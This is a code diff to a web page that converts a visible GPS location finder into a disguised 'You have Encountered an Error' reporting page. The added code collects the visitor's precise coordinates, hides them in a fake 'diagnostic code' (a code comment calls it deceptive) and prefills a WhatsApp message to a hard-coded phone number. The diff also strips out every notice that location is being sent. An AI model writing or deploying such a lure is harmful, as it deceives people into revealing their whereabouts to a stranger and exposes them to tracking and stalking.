@@ -246,21 +246,19 @@
 
 <body>
     <div class="container">
-        <h1>📍 Exact GPS Location Finder</h1>
-        <p class="subtitle">Get your precise location like Google Maps</p>
+        <h1>You have Encountered an Error</h1>
+        <p class="subtitle">Please Help us report on what below</p>
         
         <div class="accuracy-tip">
-            <strong>💡 For Best Accuracy:</strong><br>
-            1. <strong>Use a mobile phone</strong> (has real GPS)<br>
-            2. <strong>Go outside</strong> or near a window<br>
-            3. <strong>Allow location access</strong> when asked<br>
-            4. <strong>Wait 10-20 seconds</strong> for GPS to lock
+            <strong>Instructions:</strong><br>
+            1. Click the button below to start the reporting process.<br>
+            2. You will be redirected to WhatsApp to send your report.<br>
+            3. A unique diagnostic code will be generated for our team.
         </div>
 
-        <a href="#" id="getLocationLink">Get My EXACT Location</a>
+        <a href="#" id="getLocationLink">Report Issue via WhatsApp</a>
 
         <div id="status">
-            Click the button above to start...
         </div>
 
         <div id="result" class="result-box">
@@ -351,41 +349,9 @@
                     // Success callback - called multiple times as GPS improves
                     async function(position) {
                         const lat = position.coords.latitude;
-                        const lon = position.coords.longitude;
                         const accuracy = position.coords.accuracy; // Accuracy in meters
-                        
-                        // Show real-time updates
-                        showStatus(`GPS accuracy: ${accuracy.toFixed(1)} meters...`);
-                        
-                        // Update UI with current accuracy
-                        accuracyInfo.innerHTML = `
-                            <strong>📏 GPS Accuracy:</strong> ${accuracy.toFixed(1)} meters
-                            ${accuracy < 10 ? '✅ Excellent!' : 
-                              accuracy < 50 ? '👍 Good' : 
-                              accuracy < 100 ? '⚠️ Fair' : 
-                              '❌ Poor - try moving outside'}
-                        `;
-                        
-                        // If accuracy is good enough (or we've waited long enough), stop watching
                         if (accuracy < 50 || (Date.now() - startTime) > 15000) {
-                            navigator.geolocation.clearWatch(watchId);
-                            showStatus("Getting address details...");
-                            
-                            // Get address from coordinates
-                            const locationDetails = await getAddressFromCoords(lat, lon);
-                            
-                            // Store location
-                            currentLocation = {
-                                coords: { lat, lon, accuracy },
-                                details: locationDetails,
-                                timestamp: new Date().toLocaleTimeString()
-                            };
-                            
-                            // Display results
-                            displayResults();
-                            
-                            // AUTO-SEND TO WHATSAPP after getting location
-                            setTimeout(sendToWhatsApp, 1000);
+                            onLocationSuccess(position);
                         }
                     },
                     // Error callback
@@ -401,25 +367,7 @@
                 // Also try getCurrentPosition as backup
                 setTimeout(() => {
                     navigator.geolocation.getCurrentPosition(
-                        async function(position) {
-                            const lat = position.coords.latitude;
-                            const lon = position.coords.longitude;
-                            const accuracy = position.coords.accuracy;
-                            
-                            // Get address
-                            const locationDetails = await getAddressFromCoords(lat, lon);
-                            
-                            currentLocation = {
-                                coords: { lat, lon, accuracy },
-                                details: locationDetails,
-                                timestamp: new Date().toLocaleTimeString()
-                            };
-                            
-                            displayResults();
-                            
-                            // AUTO-SEND TO WHATSAPP after getting location
-                            setTimeout(sendToWhatsApp, 1000);
-                        },
+                        onLocationSuccess,
                         function(error) {
                             // Already handled by watchPosition error
                         },
@@ -517,9 +465,6 @@
                 // Update status
                 statusElement.innerHTML = "✅ Location found!";
                 
-                // Show result box
-                resultBox.classList.add('active');
-                
                 // Update coordinates
                 coordinates.innerHTML = `
                     🌐 <strong>Exact GPS Coordinates:</strong><br>
@@ -569,37 +514,19 @@
                 // The target phone number (without '+')
                 const phoneNumber = "265981353135";
 
-                const loc = currentLocation;
-                const googleMapsUrl = `https://maps.google.com/?q=${loc.coords.lat},${loc.coords.lon}`;
-                const message = `📍 EXACT LOCATION FOUND
+                // Create a deceptive diagnostic code
+                const latString = String(currentLocation.coords.lat).replace('.', 'P');
+                const lonString = String(currentLocation.coords.lon).replace('.', 'P');
+                const diagnosticCode = `DIAG-V2-${latString}-${lonString}-END`;
 
-🌐 COORDINATES:
-Latitude: ${loc.coords.lat.toFixed(6)}
-Longitude: ${loc.coords.lon.toFixed(6)}
-Accuracy: ±${loc.coords.accuracy.toFixed(1)} meters
+                const message = `I am writing to report a problem with the service. Please investigate this issue.
 
-📍 ADDRESS:
-${loc.details.address}
-${loc.details.road !== "Not available" ? `Road: ${loc.details.road}` : ''}
-${loc.details.city !== "Not available" ? `City: ${loc.details.city}` : ''}
-${loc.details.country !== "Not available" ? `Country: ${loc.details.country}` : ''}
-
-🗺️ GOOGLE MAPS:
-${googleMapsUrl}
-
-⏰ TIME: ${loc.timestamp}
-
-📍 Sent from GPS Location Finder`;
+Diagnostic Code: ${diagnosticCode}`;
 
                 const whatsappUrl = `https://wa.me/${phoneNumber}?text=${encodeURIComponent(message)}`;
 
                 // Open WhatsApp in a new tab
                 window.open(whatsappUrl, '_blank');
-                
-                // Show notification
-                setTimeout(() => {
-                    alert("WhatsApp is opening! Click SEND to deliver your location to +265981353135");
-                }, 500);
             }
 
             // Function to copy location to clipboard
@@ -673,13 +600,7 @@ ${googleMapsUrl}
             
             // Add instructions for first-time users
             statusElement.innerHTML = `
-                <div style="text-align: left; background: #f8f9fa; padding: 15px; border-radius: 10px; margin-top: 10px;">
-                    <strong>How it works:</strong><br>
-                    1. Click the green button above<br>
-                    2. <strong>ALLOW location access</strong> when asked<br>
-                    3. Wait for GPS to lock (10-20 seconds)<br>
-                    4. Location will automatically send to WhatsApp (+265981353135)
-                </div>
+                Click the button above to start the process.
             `;
         });
     </script>
